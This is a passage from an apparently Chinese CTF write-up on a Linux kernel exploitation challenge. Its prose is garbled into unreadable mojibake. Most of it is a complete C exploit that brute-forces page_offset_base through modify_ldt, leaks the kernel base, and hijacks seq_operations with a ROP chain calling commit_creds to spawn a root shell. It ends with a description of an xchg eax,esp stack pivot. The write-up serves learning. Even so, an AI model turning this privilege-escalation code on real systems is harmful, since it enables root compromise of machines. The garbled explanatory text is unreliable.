class="number">0</span>;</span><br><span class="line">        u_desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">        u_desc.useable = <span class="number">0</span>;</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;u_desc, <span class="keyword">sizeof</span>(u_desc));</span><br><span class="line">        sleep(<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (geteuid())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fail\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;okk\n&quot;</span>);</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="è§£æ³•äºŒ-éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq-operations-ropææƒ"><a href="#è§£æ³•äºŒ-éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq-operations-ropææƒ" class="headerlink" title="è§£æ³•äºŒ éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq_operations+ropææƒ"></a>è§£æ³•äºŒ éå†å†…å­˜æ³„éœ²åœ°å€åŠ«æŒseq_operations+ropææƒ</h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ€»çš„æ¥è¯´å°±æ˜¯å…ˆåˆ©ç”¨modify_ldtçˆ†ç ´<code>page_0ffset_base</code>è¿™å—çš„çº¿æ€§åœ°å€ï¼Œè¿™æ®µè™šæ‹Ÿåœ°å€åœ¨<code>ret2dir</code>ä¸­å°±å­¦ä¹ åˆ°è¿‡ï¼Œæ˜¯ä¸€æ®µè¿ç»­çš„è™šæ‹Ÿåœ°å€ï¼Œä¸€å…±æœ‰64TB,æ˜ å°„äº†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ï¼Œ<code>kmalloc</code>çš„å†…å­˜ç”³è¯·å°±æ˜¯åœ¨è¿™é‡Œè¿›è¡Œçš„ï¼Œåœ¨ä¸å¼€kaslrçš„æ—¶å€™ï¼Œ<code>page_offset_base=0xffff888000000000</code>,ä½†æ˜¯æœ¬é¢˜å¼€äº†ï¼Œæ‰€ä»¥éœ€è¦çˆ†ç ´è¿™ä¸ªçš„åœ°å€ï¼Œçˆ†ç ´å°±æ˜¯åˆ©ç”¨<code>read_ldt</code>æ¥çˆ†ç ´ï¼Œ</p>
<p>ä»£ç å¦‚ä¸‹,å°±æ˜¯åœ¨<code>0xffff888000000000</code>çš„åŸºç¡€ä¸Šæ¯æ¬¡åŠ <code>0x40000000</code>ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦åŠ <code>0x40000000</code>,æˆ‘çŒœæµ‹æ˜¯<code>page_offset_base</code>ä¹Ÿæ˜¯æŒ‡å®šçš„å‡ ä½éšæœºåŒ–ï¼Œå’Œä»£ç æ®µä¸€æ ·ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">   *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">       chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">       <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">       <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">           page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">           *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br></pre></td></tr></table></figure>

<p>è‡³äºä¸ºä»€ä¹ˆä¸ç›´æ¥çˆ†ç ´kernelçš„ä»£ç æ®µï¼Œæˆ‘å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°äº†å†…æ ¸ä¼šç›´æ¥æŠ¥é”™é€€å‡ºï¼Œè‡³äºåŸå› ï¼Œåº”è¯¥æ˜¯å†…æ ¸å¼€å¯äº† <code>Hardened Usercopy</code>ä¿æŠ¤ï¼Œå¼€å¯è¿™ä¸ªä¿æŠ¤åï¼Œåœ¨å‘å†…æ ¸æ‹·è´æ•°æ®æˆ–è€…ä»å†…æ ¸ä¸­æ‹·è´æ•°æ®çš„æ—¶å€™å°±ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥è¿™æ®µå†…æ ¸å†…å­˜æ˜¯å¦åœ¨å †æ ˆä¸­ï¼Œæ˜¯å¦æ˜¯objectï¼Œæ˜¯å¦éå†…æ ¸æˆ–è€…ä»£ç æ®µï¼ŒæŒ‰æˆ‘çš„ç†è§£ï¼Œç®€è€Œè¨€ä¹‹ï¼Œæœ‰äº›å†…å­˜å¯ä»¥æ‹·è´ï¼Œæ¯”å¦‚å †æ ˆï¼Œæœ‰äº›å°±ä¸è¡Œï¼Œæ¯”å¦‚ä»£ç æ®µã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">size_t</span> *)buf1=vmlinux_nokaslr_addr;</span><br><span class="line">   <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">       chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;num:%d\n&quot;</span>,i);</span><br><span class="line">       <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">       <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">           vmlinux_nokaslr_addr+=<span class="number">0x100000</span>;</span><br><span class="line">           *(<span class="keyword">size_t</span> *)buf1=vmlinux_nokaslr_addr;</span><br><span class="line">           i++;</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,vmlinux_nokaslr_addr);</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´å‡ºæ¥<code>page_offset_base</code>,é‚£å°±å¯ä»¥åˆ©ç”¨<code>read_ldt</code>åœ¨è¿™æ®µåœ°å€ä¸Šè¯»å–å †ä¿¡æ¯ï¼Œå †ä¸­å°±æœ‰kernel_baseåœ°å€ï¼Œç„¶åå°±æ˜¯<code>seq_operations</code>+å†…æ ¸<code>pt_regs</code>æ ˆè¿ç§»æ‰“äº†ã€‚</p>
<h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x180_pop_3_ret 0xffffffff815141ae</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff8108c420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00fb0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810c9540</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810c99d0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_2_ret 0xffffffff810006a6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret_gadget 0xffffffff810001fc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_2_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret_addr;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr;</span><br><span class="line"><span class="keyword">int</span> offsets;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ko_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_free</span><span class="params">(<span class="keyword">size_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;0&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_edit</span><span class="params">(<span class="keyword">size_t</span> idx,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=idx;</span><br><span class="line">    args[<span class="number">1</span>]=<span class="number">8</span>;</span><br><span class="line">    args[<span class="number">2</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27;P&#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">chunk_add</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">3</span>];</span><br><span class="line">    args[<span class="number">0</span>]=size;</span><br><span class="line">    args[<span class="number">1</span>]=buf;</span><br><span class="line">    ioctl(ko_fd,<span class="string">&#x27; &#x27;</span>,args);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] debug\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv, <span class="keyword">char</span> ** envp)</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> buf2[<span class="number">0x1000</span>];</span><br><span class="line">    ko_fd=open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(buf1,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    chunk_add(<span class="number">0x10</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">1</span>,&amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base=<span class="number">0xffff888000000000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">        <span class="keyword">int</span> ret=syscall(SYS_modify_ldt,<span class="number">0</span>,buf1,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            page_offset_base+=<span class="number">0x40000000</span>;</span><br><span class="line">            *(<span class="keyword">size_t</span> *)buf1=page_offset_base;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base_addr:%p\n&quot;</span>,page_offset_base);</span><br><span class="line">    <span class="comment">// size_t addr=page_offset_base;</span></span><br><span class="line">    <span class="comment">// *(size_t *)buf1=addr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(int i=0;i&lt;0x200;i++)&#123;</span></span><br><span class="line">    <span class="comment">//     chunk_edit(0,buf1);</span></span><br><span class="line">    <span class="comment">//     int ret=syscall(SYS_modify_ldt,0,buf2,0x1000);</span></span><br><span class="line">    <span class="comment">//     if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//         printf(&quot;write again fail\n&quot;);</span></span><br><span class="line">    <span class="comment">//         continue;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     for(int j=0;j&lt;0x1000/8;j++)&#123;</span></span><br><span class="line">    <span class="comment">//         size_t content=*((size_t *)buf2+j);</span></span><br><span class="line">    <span class="comment">//         if((content&amp;0xffffffff00000000)==0xffffffff00000000)&#123;</span></span><br><span class="line">    <span class="comment">//             if((content&amp;0xffffffff)!=0xffffffff)&#123;</span></span><br><span class="line">    <span class="comment">//                 printf(&quot;kernel_addr:%p  content:%p\n&quot;,addr+8*j,*((size_t *)buf2+j));</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">                </span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     addr+=0x1000;</span></span><br><span class="line">    <span class="comment">//     *(size_t *)buf1=addr;</span></span><br><span class="line">    <span class="comment">//     memset(buf2,0,0x1000);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">size_t</span> addr=page_offset_base+<span class="number">0x9d000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=addr;</span><br><span class="line">    chunk_edit(<span class="number">0</span>,buf1);</span><br><span class="line">    syscall(SYS_modify_ldt,<span class="number">0</span>,buf2,<span class="number">0x1000</span>);</span><br><span class="line">    kernel_base=*(<span class="keyword">size_t</span> *)buf2<span class="number">-0x40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel_base:%p\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    chunk_add(<span class="number">0x20</span>,buf1);</span><br><span class="line">    chunk_free(<span class="number">1</span>);</span><br><span class="line">    seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    add_rsp_0x180_pop_3_ret_addr=add_rsp_0x180_pop_3_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    prepare_kernel_cred_addr=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base+<span class="number">0xe</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf1=add_rsp_0x180_pop_3_ret_addr;</span><br><span class="line">    chunk_edit(<span class="number">1</span>,buf1);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rdi_ret_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, prepare_kernel_cred_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// read(seq_fd,buf1,0x200);</span></span><br><span class="line">    usr_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å®˜æ–¹è§£æ³•"><a href="#å®˜æ–¹è§£æ³•" class="headerlink" title="å®˜æ–¹è§£æ³•"></a>å®˜æ–¹è§£æ³•</h2><p>ååˆ†å·§å¦™çš„è§£æ³•ï¼Œå­¦åˆ°äº†å¾ˆå¤šã€‚</p>
<p>å®˜æ–¹å‰æœŸçš„åœ°å€çˆ†ç ´å’Œæˆ‘å¤§å·®ä¸å·®ï¼Œä½†åœ¨åé¢å¯¹<code>seq_operations</code>çš„<code>start</code>æŒ‡é’ˆçš„åˆ©ç”¨å¼€å§‹ä¸ä¸€æ ·äº†ï¼Œç”±äºåªå¼€äº†<code>kpti</code>å’Œ<code>smep</code>ï¼Œæ‰€ä»¥åœ¨å†…æ ¸æ€è¿˜æ˜¯å¯ä»¥è®¿é—®ç”¨æˆ·æ€æ•°æ®çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®å†…æ ¸ropç„¶ååœ¨å†…æ ¸æ€ç›´æ¥æŠŠspå¯„å­˜å™¨è¿ç§»åˆ°ç”¨æˆ·æ€ã€‚</p>
<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆåˆ©ç”¨ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆè®©rspæŒ‡å‘è‡ªå·±å¸ƒç½®åœ¨å†…æ ¸æ€çš„ropå‘¢ï¼Œå®˜æ–¹è§£æ³•é‡Œç»™å‡ºäº†ä¸€ä¸ªååˆ†å·§å¦™ï¼ˆè‡³å°‘æˆ‘ç¬¬ä¸€æ¬¡è§ï¼‰çš„æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨ä»¥ä¸‹gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xchg_eax_esp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>xchgå°±æ˜¯äº’æ¢ä¸¤ä¸ªå¯„å­˜å™¨çš„æ•°æ®ï¼Œä¸€èˆ¬å‡½æ•°æŒ‡é’ˆéƒ½æ˜¯å…ˆåŠ è½½åˆ°raxå¯„å­˜å™¨ä¸­ç„¶åå†<code>call rax</code>çš„ï¼Œæ‰€ä»¥æ‰§è¡Œ<code>xchg eax, esp</code>çš„æ—¶å€™raxå°±æŒ‡å‘è¿™ä¸ªgadgetçš„åœ°å€ï¼Œè¿™ä¸ªgadgetçš„åœ°å€æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯å¯æƒœæ˜¯å†…æ ¸åœ°å€ï¼Œä½†æ˜¯æ³¨æ„è¿™ä¸ªgadgetåªæ˜¯äº¤æ¢å¯„å­˜å™¨çš„å32ä½ï¼Œäº¤æ¢å®Œåçš„espå°±è½åˆ°äº†ç”¨æˆ·æ€äº†ï¼Œéšæ„æˆ‘ä»¬åªè¦<code>mmap(xchg_eax_esp &amp; 0xfffff000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code>å°±å¯ä»¥æŠŠrspæŒ‡å‘ç”¨æˆ·æ€äº†ã€‚</p>
